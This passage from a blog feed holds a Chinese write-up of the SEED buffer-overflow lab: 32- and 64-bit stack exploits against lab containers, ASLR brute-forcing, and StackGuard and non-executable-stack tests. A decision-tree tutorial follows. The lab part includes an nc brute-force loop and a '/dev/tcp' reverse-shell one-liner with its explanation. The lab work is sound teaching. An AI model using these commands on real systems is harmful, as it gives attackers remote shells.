9090<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049719.png"alt="image-20231011101158575" /><figcaption aria-hidden="true">image-20231011101158575</figcaption></figure></li><li><p>查看 ip 发现显示服务器的 ip，成功实现反弹 shell</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049720.png"alt="image-20231011101222506" /><figcaption aria-hidden="true">image-20231011101222506</figcaption></figure></li></ul></li></ol><h1 id="task-3-level-2-attack">5. Task 3: Level-2 Attack</h1><p>在本任务中，我们将通过不显示一条重要信息来增加一点攻击难度。我们的目标服务器是10.9.0.6（端口号仍为 9090，易受攻击程序仍为 32位程序）。让我们先向该服务器发送一条良性信息。我们将看到目标容器打印出以下信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121069.png"alt="image-20231207105106937" /><figcaption aria-hidden="true">image-20231207105106937</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121070.png"alt="image-20231207105127323" /><figcaption aria-hidden="true">image-20231207105127323</figcaption></figure><p>正如你所看到的，服务器只给出了一个提示，即缓冲区的地址，并没有透露帧指针的值。这意味着，缓冲区的大小是未知的。这使得利用该漏洞比一级攻击更加困难。虽然可以在Makefile中找到实际的缓冲区大小，但在攻击中不允许使用该信息，因为在现实世界中，您不太可能拥有该文件。为了简化任务，我们假设缓冲区大小的范围是已知的。另一个可能对你有用的事实是，由于内存对齐，存储在帧指针中的值总是四的倍数（对于32 位程序）。</p><p><code>Range of the buffer size (in bytes): [100, 300]</code></p><p>您的任务是构建一个有效载荷来利用服务器上的缓冲区溢出漏洞，并在目标服务器上获得root shell（使用反向 shell技术）。请注意，您只能构建一个有效载荷，且该有效载荷必须适用于该范围内的任何缓冲区大小。如果使用"暴力"方法，即每次只尝试一种缓冲区大小，则无法获得所有积分。尝试的次数越多，就越容易被受害者发现并击败。这就是为什么尽量减少试验次数对攻击非常重要。在实验报告中，您需要描述您的方法并提供证据。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>向目标服务器 10.9.0.6送消息，然后观察服务器端打印出的信息。信息中仅包含 buffer地址(0xffffd2b8)，没有显示帧指针的值,即无法直接计算出 ret 地址。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049721.png"alt="image-20231011101500690" /><figcaption aria-hidden="true">image-20231011101500690</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049722.png"alt="image-20231011101505995" /><figcaption aria-hidden="true">image-20231011101505995</figcaption></figure></li><li><p>修改exploit.py。ret=0xffffd2b8(buffer地址)+300(缓冲区最大容量)+8(前ebp+ret)=0xffffd3ec，加上的值只用大于等于308，能命中shellcode前填充区，让 shellcode 执行即可，此处以加 308为例。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049723.png"alt="image-20231011101548428" /><figcaption aria-hidden="true">image-20231011101548428</figcaption></figure></li><li><p><strong>难点</strong>：offset值如何设定。因为只能构建一个有效载荷，该有效载荷需要可用于此范围内的任何缓冲区大小。根据实验指导得知buffer_size的限制在：[100, 300]。并且，在 32位程序中，由于内存对齐的原因，在帧指针中存储的值总是四的倍数。因此我们直接将所有可能的位置都用新ret 地址进行覆盖。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049724.png"alt="image-20231011101948481" /><figcaption aria-hidden="true">image-20231011101948481</figcaption></figure></li><li><p>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</p></li></ol><h1 id="task-4-level-3-attack">6. Task 4: Level-3 Attack</h1><p>在前面的任务中，我们的目标服务器是 32位程序。在本任务中，我们将切换到 64 位服务器程序。我们的新目标是10.9.0.7，它运行 64 位版本的栈程序。让我们先向服务器发送一条 hello消息。我们将看到目标容器打印出以下信息。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121071.png"alt="image-20231207105903767" /><figcaption aria-hidden="true">image-20231207105903767</figcaption></figure><p>您可以看到帧指针和缓冲区地址的值变成了 8 字节长（而不是 32 位程序中的4字节）。您的任务是构建有效载荷，利用服务器的缓冲区溢出漏洞。您的最终目标是在目标服务器上获得一个root shell。您可以使用任务 1 中的 shellcode，但需要使用 64 位版本的shellcode。</p><p>挑战：与 32 位机器上的缓冲区溢出攻击相比，64位机器上的攻击难度更大。最困难的部分是地址。虽然 x64 架构支持 64位地址空间，但只允许使用 0x00 至 0x00007FFFFFFFFFFF的地址。这意味着对于每个地址（8 个字节），最高的两个字节总是0。这就造成了一个问题。</p><p>在缓冲区溢出攻击中，我们需要在有效负载中存储至少一个地址，并通过strcpy() 将有效负载复制到堆栈中。我们知道，strcpy() 函数会在看到 0时停止复制。因此，如果有效载荷中间出现一个 0，0后面的内容就无法复制到栈中。如何解决这个问题是这次攻击中最困难的挑战。您需要在报告中描述如何解决这一问题。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>向目标服务器 10.9.0.7送消息，然后观察服务器端打印出的信息。观察到帧指针和 buffer 地址变为了 8字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049725.png"alt="image-20231011102140559" /><figcaption aria-hidden="true">image-20231011102140559</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049726.png"alt="image-20231011102145762" /><figcaption aria-hidden="true">image-20231011102145762</figcaption></figure></li><li><p>解决方案：不再将 shellcode 放在 badfile 结尾部分，而是将其放至badfile 开头，令ret的值指向前面部分。由于是小端存储，在截止前ret前面内容及其非零部分已经被成功拷贝。</p></li><li><p>修改 exploit.py 中 shellcode，采用 task1 中使用的 64位shellcode</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049727.png"alt="image-20231011102413481" /><figcaption aria-hidden="true">image-20231011102413481</figcaption></figure></li><li><p>start 设置为 0（也可以是其他较小值，目的是让 shellcode 在ret前），使 shellcode 位于 badfile 开头</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049728.png"alt="image-20231011102436372" /><figcaption aria-hidden="true">image-20231011102436372</figcaption></figure></li><li><p>ret=buffer地址(0x00007fffffffe1e0)+start，此处为0x00007fffffffe1e0；offset=rbp(0x00007fffffffe2b0)-buffer(0x00007fffffffe1e0)+8(rbp占 8 字节)=216，offset 为 10 进制。ret 转为字节码的部分需要改为以 8为步长。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049729.png"alt="image-20231011102528980" /><figcaption aria-hidden="true">image-20231011102528980</figcaption></figure></li><li><p>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</p></li></ol><h1 id="task-5-level-4-attack">7. Task 5: Level-4 Attack</h1><p>本任务中的服务器与第 3级类似，只是缓冲区的大小要小得多。从下面的打印输出可以看出，帧指针与缓冲区地址之间的距离只有32 字节左右（实验室中的实际距离可能不同）。在第 3级中，距离要大得多。你的目标是一样的：获取服务器上的 rootshell。服务器仍然从用户那里接收 517 字节的输入数据。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121072.png"alt="image-20231207110504029" /><figcaption aria-hidden="true">image-20231207110504029</figcaption></figure><ol type="1"><li><p>向目标服务器 10.9.0.7 送消息，然后观察服务器端打印出的信息。发现buffer 大小仅为 96 字节。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049730.png"alt="image-20231011102717893" /><figcaption aria-hidden="true">image-20231011102717893</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049731.png"alt="image-20231011102722540" /><figcaption aria-hidden="true">image-20231011102722540</figcaption></figure></li><li><p>难点：buffer 大小过小，可能无法容纳shellcode，因此需要将shellcode 放在 badfile 结尾处。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049732.png"alt="image-20231011102745704" /><figcaption aria-hidden="true">image-20231011102745704</figcaption></figure></li><li><p>offset=rbp-buffer+8=104,基本原理同上一个task。<strong>难点</strong>在于返回地址的设置，因为 ret 中 00的存在，结尾的shellcode 不能被成功拷贝，因此需要让 ret 指向主函数中 str数组中 shellcode的位置（注：此处对于 ret 设置不是很清楚）</p></li></ol><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049733.png"alt="image-20231011103039147" /><figcaption aria-hidden="true">image-20231011103039147</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049734.png"alt="image-20231011102851075" /><figcaption aria-hidden="true">image-20231011102851075</figcaption></figure><ol start="5" type="1"><li>重新生成 badfile，在本机开启监听端口，将 badfile发送给目标服务端。查看 ip 发现显示服务器的 ip，成功实现反弹shell。（基本同上）</li></ol><h1 id="task-6-experimenting-with-the-address-randomization">8. Task 6:Experimenting with the Address Randomization</h1><p>在本实验室开始时，我们关闭了其中一项反制措施，即地址空间布局随机化（ASLR）。在本任务中，我们将重新打开它，看看它对攻击有何影响。您可以在虚拟机上运行以下命令启用ASLR。这一更改是全局性的，会影响虚拟机中运行的所有容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049735.png"alt="image-20231011103159396" /><figcaption aria-hidden="true">image-20231011103159396</figcaption></figure><p>请向 1 级和 3 级服务器发送 Hello消息，并发送多次。请在报告中汇报您的观察结果，并解释为什么 ASLR会增加缓冲区溢出攻击的难度。</p><p>击败 32 位随机化。据报道，在 32 位 Linux 机器上，只有 19个位可用于地址随机化。这还远远不够，如果我们运行足够多的攻击次数，就能轻松击中目标。对于64 位机器，用于随机化的位数会大幅增加。</p><p>在本任务中，我们将在 32 位 1 级服务器上进行尝试。我们使用 "暴力"方法反复攻击服务器，希望我们在有效负载中输入的地址最终是正确的。我们将使用1 级攻击中的有效载荷。您可以使用下面的 shell脚本无限循环运行易受攻击的程序。如果出现反向shell，脚本就会停止，否则就会继续运行。如果你运气不差，应该能在 10分钟内获得反向 shell。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br>SECONDS=0<br>value=0<br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>value=$(( <span class="hljs-variable">$value</span> + <span class="hljs-number">1</span> ))<br>duration=<span class="hljs-variable">$SECONDS</span><br>min=$((<span class="hljs-variable">$duration</span> / <span class="hljs-number">60</span>))<br>sec=$((<span class="hljs-variable">$duration</span> % <span class="hljs-number">60</span>))<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$min</span> minutes and <span class="hljs-variable">$sec</span> seconds elapsed.&quot;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The program has been running <span class="hljs-variable">$value</span> times so far.&quot;</span><br><span class="hljs-built_in">cat</span> badfile | nc 10.9.0.5 9090<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p><strong>实验流程：</strong></p><ol type="1"><li><p>向 level 1 和 level 3 中服务器发送 Hello消息，并发送多次，发现每次地址都在随机变化。<strong>ASLR会使缓冲区溢出攻击变得更加困难原因</strong>：意味着攻击者无法事先知道要攻击的特定内存地址，因为它们在每次启动时都会发生变化；不再能够确定可执行代码或关键数据的确切位置；迫使攻击者需要更复杂的技术来发现内存布局，增加了攻击的难度和成本。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049736.png"alt="image-20231011103317313" /><figcaption aria-hidden="true">image-20231011103317313</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049737.png"alt="image-20231011103323882" /><figcaption aria-hidden="true">image-20231011103323882</figcaption></figure></li><li><p><strong>解决方案</strong>：无限循环运行易受攻击的程序，暴力破解。使用Level 1 中 exploit.py 重新生成badfile，在本机开启监听，执行暴力破解脚本，16923 次时成功破解。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049738.png"alt="image-20231011103637351" /><figcaption aria-hidden="true">image-20231011103637351</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049739.png"alt="image-20231011103642836" /><figcaption aria-hidden="true">image-20231011103642836</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049740.png"alt="image-20231011103650245" /><figcaption aria-hidden="true">image-20231011103650245</figcaption></figure></li><li><p>查看 ip 发现显示服务器的 ip，成功实现反弹 shell</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049741.png"alt="image-20231011103708030" /><figcaption aria-hidden="true">image-20231011103708030</figcaption></figure></li></ol><h1 id="task-7-experimenting-with-other-countermeasures">9. Task 7:Experimenting with Other Countermeasures</h1><h2 id="task-7.a-turn-on-the-stackguard-protection">9.1 Task 7.a: Turnon the StackGuard Protection</h2><p>许多编译器（如 gcc）都实现了一种名为 StackGuard的安全机制，以防止缓冲区溢出。有了这种保护措施，缓冲区溢出攻击就无法奏效。所提供的易受攻击程序在编译时并未启用StackGuard 保护机制。在本任务中，我们将打开它，看看会发生什么。</p><p>请进入 server-code 文件夹，移除 gcc 标志中的 -fno-stack-protector标志，然后编译 stack.c。我们将只使用stack-L1，但不是在容器中运行，而是直接从命令行运行。让我们创建一个可能导致缓冲区溢出的文件，然后输入文件stack-L1 的内容。请描述并解释你的观察结果。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>进入 server-code 文件夹，去除 -fno-stack-protector 选项编译stack.c，然后将 badfile作为可执行文件输入。出现报错：<code>stack smashing</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049742.png"alt="image-20231011103821396" /><figcaption aria-hidden="true">image-20231011103821396</figcaption></figure></li><li><p>正常的函数调用时，函数调用栈的示意图</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049743.png"alt="image-20231011104543776" /><figcaption aria-hidden="true">image-20231011104543776</figcaption></figure></li><li><p>StackGuard如何发挥作用。由上图可以看到，缓冲区溢出攻击的核心点在于，由于程序没有检测边界，而攻击者利用这一点，覆盖函数的返回地址。如果我们有办法能检测到程序是否被修改，就可以作出一定的防御，比如检测到被修改，就退出。StackGuard的方法很简单，就是往返回地址后面插入一段特殊值(称之为canary)，在函数返回之前，首先检查这个特殊值是否被修改，如果被修改了，说明发生了缓冲区溢出攻击。更安全的方式是，插入这段特殊值，是随机值。但是，即便如此，攻击者仍然有办法绕过，那就是不修改这段值，而是直接修改返回地址，但是这很难做到，因为攻击者无法知道这段随机值到底是多长。另外由于随机化，攻击者也无法轻易复制这一段随机值。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049744.png"alt="image-20231011104754440" /><figcaption aria-hidden="true">image-20231011104754440</figcaption></figure></li><li><p>总结：StackGuard是一种编译器扩展，可增强编译器生成的可执行代码，从而检测并阻止针对堆栈的缓冲区溢出攻击。其效果对程序的正常功能是透明的。要注意到程序是否经过StackGuard 增强，唯一的方法就是使程序执行具有未定义行为的 C 语句：StackGuard增强程序定义了在函数仍处于活动状态时写入函数返回地址的行为。</p></li></ol><h2 id="task-7.b-turn-on-the-non-executable-stack-protection">9.2 Task7.b: Turn on the Non-executable Stack Protection</h2><p>操作系统过去允许使用可执行堆栈，但现在情况有所改变：在 Ubuntu操作系统中，程序（和共享库）的二进制映像必须声明它们是否需要可执行堆栈，也就是说，它们需要在程序头中标记一个字段。内核或动态链接器会使用该标记来决定是否将该运行程序的堆栈设置为可执行或不可执行。这种标记由gcc自动完成，它默认情况下会将堆栈设置为不可执行。我们可以在编译时使用"-znoexecstack "标记，将堆栈设为不可执行。在前面的任务中，我们使用了"-zexecstack "来使堆栈可执行。</p><p>在本任务中，我们将使堆栈不可执行。我们将在 shellcode文件夹中进行这项实验。调用 shellcode 程序会将 shellcode的副本放到堆栈中，然后执行堆栈中的代码。请重新编译 call shellcode.c 到a32.out 和 a64.out，不要使用"-z execstack"选项。运行它们，描述并解释您的观察结果。</p><p><strong>对抗不可执行堆栈对策</strong>：需要注意的是，不可执行堆栈只是使shellcode无法在堆栈上运行，但并不能防止缓冲区溢出攻击，因为利用缓冲区溢出漏洞后，还有其他方法可以运行恶意代码。return-to-libc攻击就是一个例子。我们为这种攻击设计了一个单独的实验室。如有兴趣，请参阅我们的Return-to-Libc 攻击实验室了解详情。</p><p><strong>实验流程：</strong></p><ol type="1"><li><p>进入 shellcode 文件夹，去除 -z execstack 编译call_shellcode.c并运行，出现报错：<code>Segmentation fault</code></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310111049745.png"alt="image-20231011103924910" /><figcaption aria-hidden="true">image-20231011103924910</figcaption></figure></li></ol><h1 id="guidelines-on-reverse-shell">10. Guidelines on ReverseShell</h1><p>反向 shell的主要思想是将其<strong>标准输入、输出和错误设备</strong>重定向到网络连接上，这样shell就能从网络连接上获取输入，并将输出打印到网络连接上。连接的另一端是攻击者运行的程序；该程序只需在另一端显示来自shell 的内容，并通过网络连接将攻击者输入的内容发送给 shell。</p><p>攻击者常用的一个程序是 netcat，如果使用"-l "选项运行，它就会成为一个TCP服务器，在指定端口上监听连接。该服务器程序基本上会打印出客户端发送的内容，并将运行服务器的用户输入的内容发送给客户端。在下面的实验中，netcat（简称nc）用于监听 9090 端口的连接（让我们只关注第一行）。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071121074.png"alt="image-20231207103728679" /><figcaption aria-hidden="true">image-20231207103728679</figcaption></figure><p>上述 nc命令将阻塞，等待连接。现在，我们直接在服务器机器（10.0.2.5）上运行以下bash 程序，模拟攻击者通过 Shellshock 攻击入侵服务器后运行的程序。该 bash命令将触发与攻击者机器 9090 端口的 TCP 连接，并创建一个反向shell。我们可以从上面的结果中看到 shell 提示，这表明 shell正在服务器机器上运行；我们可以输入 ifconfig 命令来验证 IP 地址确实是10.0.2.5，即属于服务器机器的 IP 地址。下面是 bash 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Server(10.0.2.5):$ /bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;1 2&gt;&amp;1<br></code></pre></td></tr></table></figure><p>上述命令是通常会在被入侵的服务器上执行的命令。它相当复杂，我们将在下文中详细解释：</p><ul><li>"/bin/bash -i"：选项 i 代表交互式，意思是 shell必须是交互式的（必须提供 shell 提示）。</li><li>"&gt; /dev/tcp/10.0.2.6/9090"：这会将 shell的输出设备（stdout）重定向到 10.0.2.6 的端口 9090 的 TCP 连接。在 Unix系统中，stdout 的文件描述符为 1。</li><li>"0&lt;&amp;1":文件描述符 0 代表标准输入设备(stdin)。该选项告诉系统使用标准输出设备作为标准输入设备。由于 stdout已被重定向到 TCP 连接，该选项基本上表示 shell 程序将从同一 TCP连接获取输入。</li><li>"2&gt;&amp;1":文件描述符 2 代表标准错误stderr。这会导致错误输出重定向到 stdout，也就是 TCP 连接。</li></ul><p>总之，命令"/bin/bash -i &gt; /dev/tcp/10.0.2.6/9090 0&lt;&amp;12&gt;&amp;1 "会在服务器机器上启动一个 bash shell，其输入来自一个 TCP连接，输出到相同的 TCP 连接。在我们的实验中，当在 10.0.2.5 上执行 bashshell 命令时，它会连接回在 10.0.2.6 上启动的 netcat 进程。这可以通过netcat 显示的 "Connection from 10.0.2.5 ..." 消息确认。</p><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/27/网络攻防-缓冲区溢出/#Task7">网络攻防-缓冲区溢出- Sean's Blog (seanxz401.github.io)</a></li><li><ahref="https://blog.csdn.net/qq_39678161/article/details/119907828">【SEEDLabs 2.0】Buffer-Overflow Attack_buffer overflow attack lab (serverversion)_嗯嗯哈哈哈哈哈哈嗯嗯哈哈哈的博客-CSDN博客</a></li><li><a href="https://zhuanlan.zhihu.com/p/344448144">StackGuard的作用 -知乎 (zhihu.com)</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Software Security</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>决策树</title>
    <link href="/2023/10/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E5%86%B3%E7%AD%96%E6%A0%91/"/>
    <url>/2023/10/09/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%AE%97%E6%B3%95%E7%AF%87/%E5%86%B3%E7%AD%96%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="直观理解">1 直观理解</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550549.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="信息熵">2 信息熵</h1><ul><li><p>信息熵是度量样本集合纯度最常用的一种指标。</p></li><li><p>假定当前样本集合D中第k类样本所占的比例为<spanclass="math inline">\(\mathrm{p}_{\mathrm{k}}(\mathrm{k}=1,2,\ldots,|\mathrm{y}|)\)</span>，则D的信息熵定义为： <spanclass="math display">\[\operatorname{Ent}(D)=-\sum_{k=1}^{|y|} p_k \log _2 p_k\]</span></p></li><li><p>Ent(D)的值越小，则D的纯度越高</p></li></ul><h1 id="信息增益information-gain--id3决策树">3 信息增益（Informationgain）- ID3决策树</h1><ul><li><p>ID3（IterativeDichotomiser，迭代二分器）决策树学习算法，以信息增益准则来选择划分属性。</p></li><li><p>假定离散属性a有V个可能的取值<span class="math inline">\(\lbracea^1,a^2,...,a^V\rbrace\)</span>，若使用a来对样本集D进行划分，则会产生V个分支结点，其中第v个分支结点包含了D中所有在属性a上取值为<spanclass="math inline">\(a^v\)</span>的样本，即为<spanclass="math inline">\(D^v\)</span>。给分支结点赋予权重$$，样本数越多的分支结点的影响越大，信息增益越大，使用属性a对样本集D进行划分所获得的纯度提升越大。以属性a对数据集D进行划分所获得的信息增益为：<span class="math display">\[\operatorname{Gain}(\mathrm{D},\mathrm{a})=\operatorname{Ent}(\mathrm{D})-\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\operatorname{Ent}\left(\mathrm{D}^{\mathrm{v}}\right)\]</span></p></li><li><p>信息增益准则对可取值数目较多的属性有所偏好，因为属性取值多则划分的更干净。但这可能导致出现一些荒谬错误，于是引入增益率。</p></li></ul><h1 id="增益率gain-ratio--c4.5决策树">4 增益率（Gain Ratio）-C4.5决策树</h1><p><span class="math display">\[\text { Gain\_ratio(D, a })=\frac{\operatorname{Gain}(\mathrm{D},\mathrm{a})}{\mathrm{IV}(\mathrm{a})}\]</span></p><p>其中， <span class="math display">\[\mathrm{IV}(\mathrm{a})=-\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|} \log _2\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\]</span></p><ul><li>除以IV可以看做是一个归一化（标准化）过程，这里，属性a的可能取值数目越多，IV（a）值越大，信息增益除以IV后值越小，抵消了分支多的好处。但是这样一来，增益率会偏好分支少的属性，C4.5采用两步对此进行了折中改进：<ul><li>先对所有属性的信息增益进行从高到低排序，从候选划分属性中选出信息增益高于平均水平的</li><li>然后从中选出增益率高的</li></ul></li></ul><h1 id="基尼指数gini-index--cart决策树">5 基尼指数（Gini Index）-CART决策树</h1><ul><li><p>CART（Classification and RegressionTree）决策树使用基尼指数来选择划分属性，从属性集A中选择基尼指数最小的属性作为最优划分属性。从统计建模的角度出发考虑问题，前面都是用信息论角度去考虑。该算法既可用于分类，又可用于回归。</p></li><li><p>数据集D的纯度，用基尼值度量为（值越小，纯度越高）： <spanclass="math display">\[\operatorname{Gini}(\mathrm{D})=\sum_{\mathrm{k}=1}^{|\mathrm{y}|}\sum_{\mathrm{k}^{\prime} \neq \mathrm{k}} \mathrm{p}_{\mathrm{k}}\mathrm{p}_{\mathrm{k}}^{\prime}=1-\sum_{\mathrm{k}=1}^{|\mathrm{y}|}\mathrm{p}_{\mathrm{k}}^2\]</span></p></li><li><p>属性a的基尼指数定义为： <span class="math display">\[\operatorname{Gini} \_\operatorname{index}(\mathrm{D},\mathrm{a})=\sum_{\mathrm{v}=1}^{\mathrm{V}}\frac{\left|\mathrm{D}^{\mathrm{v}}\right|}{|\mathrm{D}|}\operatorname{Gini}(\mathrm{D})\]</span></p></li></ul><h1 id="剪枝pruning">6 剪枝（pruning）</h1><p>在上面我们提到了信息增益、增益率、基尼系数三个不同的划分属性，有人会疑惑，不同的划分原则是否会对结果产生影响，研究表明划分选择的各种准则虽然对决策树的尺寸有较大的影响，但对泛化性能的影响有限。相比而言，剪枝方法和程度对决策树泛化性能的影响更为显著。决策树从上到下划分实际上完成的是从全部到局部的划分，分到局部时可能会受到噪音的影响，容易产生不必要的分枝而过拟合，剪枝是决策树对付“过拟合”的主要手段。</p><h2 id="预剪枝prepruning">6.1 预剪枝（prepruning）</h2><p>指在决策树生成过程中，对每个结点在划分前先进行估计，若当前结点的划分不能带来决策树泛化性能提升，则停止划分并将当前结点标记为叶结点。示例：划分后精度变低了，则不划分进行剪枝，划分后精度没变化，遵循奥卡姆剃刀原则，不划分。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550550.png"alt="image-20231009154011573" /><figcaption aria-hidden="true">image-20231009154011573</figcaption></figure><h2 id="后剪枝postpruning">6.2 后剪枝（postpruning）</h2><p>后剪枝是指先从训练集生成一棵完整的决策树，然后自底向上地对非叶结点进行考察，若将该结点对应的子树替换为叶结点能带来决策树泛化性能提升，则将该子树替换为叶结点。示例：由下到上，每一个结点都要考察是否剪，如果剪前剪后没有变化则不剪。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550551.jpg"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550552.png"alt="image-20231009154708121" /><figcaption aria-hidden="true">image-20231009154708121</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550553.png"alt="image-20231009154730453" /><figcaption aria-hidden="true">image-20231009154730453</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550554.png"alt="image-20231009154751919" /><figcaption aria-hidden="true">image-20231009154751919</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202310091550555.png"alt="image-20231009154800431" /><figcaption aria-hidden="true">image-20231009154800431</figcaption></figure><h2 id="预剪枝vs后剪枝">6.3 预剪枝VS后剪枝</h2><p>（1）时间开销</p><ul><li>预剪枝：测试时间开销降低，训练时间开销降低</li><li>后剪枝：测试时间开销降低，训练时间开销增加</li></ul><p>（2）过/欠拟合风险：</p><ul><li>预剪枝：过拟合风险降低，欠拟合风险增加</li><li>后剪枝：过拟合风险降低，欠拟合风险基本不变</li></ul><p>（3）泛化性能：后剪枝通常优于预剪枝</p><p>参考教程：</p><ol type="1"><li><ahref="https://www.bilibili.com/video/BV1Xp4y1U7vW/?spm_id_from=333.788.recommend_more_video.-1&amp;vd_source=5a5397ea8e931fbb28195dfdfa5e1b03">【五分钟机器学习】可视化的决策过程：决策树Decision Tree_哔哩哔哩_bilibili</a></li><li><ahref="https://blog.csdn.net/weixin_43182102/article/details/122106265">【机器学习sklearn】决策树（DecisionTree）算法-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
      <category>算法篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>准确率、精确率、召回率</title>
    <link href="/2023/10/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%90%86%E8%AE%BA%E7%AF%87/%E5%87%86%E7%A1%AE%E7%8E%87%E3%80%81%E7%B2%BE%E7%A1%AE%E7%8E%87%E3%80%81%E5%8F%AC%E5%9B%9E%E7%8E%87/"/>
    <url>/2023/10/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E7%90%86%E8%AE%BA%E7%AF%87/%E5%87%86%E7%A1%AE%E7%8E%87%E3%80%81%E7%B2%BE%E7%A1%AE%E7%8E%87%E3%80%81%E5%8F%AC%E5%9B%9E%E7%8E%87/</url>
    
